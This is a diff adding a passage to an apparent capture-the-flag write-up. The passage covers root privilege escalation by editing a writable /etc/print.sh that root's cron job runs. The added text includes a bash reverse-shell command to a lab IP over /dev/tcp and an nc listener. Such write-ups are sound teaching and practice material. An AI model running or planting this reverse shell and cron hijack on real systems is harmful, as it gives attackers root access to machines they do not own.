@@ -319,3 +319,34 @@ file make a executable and run it. Wait for the cron to run and the pspy will sh
 </p>
 
 If edit planner.sh with my a reverse shell, it wil gain root access. However, when trying to do, find that root owns the file and is the only user allowed to edit.
+
+<p align="left">
+<img src="/assets/img/startup/ls-planner.png" width="350"/>
+</p>
+
+Reading the contents of planner.sh, see that at the end of the script it executes /etc/print.sh
+
+<p align="left">
+<img src="/assets/img/startup/read-planner.png" width="350"/>
+</p>
+
+Looking at /etc/print.sh and find lennie is allowed to edit this file
+
+<p align="left">
+<img src="/assets/img/startup/ls-print.png" width="350"/>
+</p>
+
+Perfect, so I can edit this file and when root executes planner.sh it will then excute print.sh as the root user. I use Pentest Monkey Reverse Shell Cheatsheet for an already made reverse shell command, editing only my IP address
+
+> echo 'bash -c "bash -i >& /dev/tcp/10.2.99.122/8001 0>&1"' > /etc/print.sh
+
+set up a nc listener and wait around a minute for a callback
+
+> nc -lvnp 8001
+
+As root, I can now read root.txt
+
+<p align="left">
+<img src="/assets/img/startup/ls-print.png" width="350"/>
+</p>
+
